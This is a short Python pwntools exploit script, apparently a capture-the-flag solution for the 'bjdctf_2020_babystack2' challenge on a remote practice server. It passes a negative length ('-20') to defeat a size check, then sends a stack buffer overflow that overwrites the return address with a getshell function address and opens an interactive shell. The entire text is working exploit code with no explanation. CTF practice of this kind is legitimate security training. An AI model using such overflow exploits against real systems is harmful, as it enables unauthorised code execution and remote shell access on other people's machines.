from pwn import *
context.log_level = 'debug'
getshell = 0x00400726

#conn = process('./bjdctf_2020_babystack2')
conn = remote('node4.buuoj.cn',26125)
#gdb.attach(conn, 'b *0x004007e5')
conn.recvuntil(b'name:\n')

payload = b'-20'
conn.sendline(payload)
conn.recvuntil(b'name?\n')
payload = b'a' * (0x10 + 0x8) + p64(getshell)
conn.send(payload)
#conn.recv()
conn.interactive()
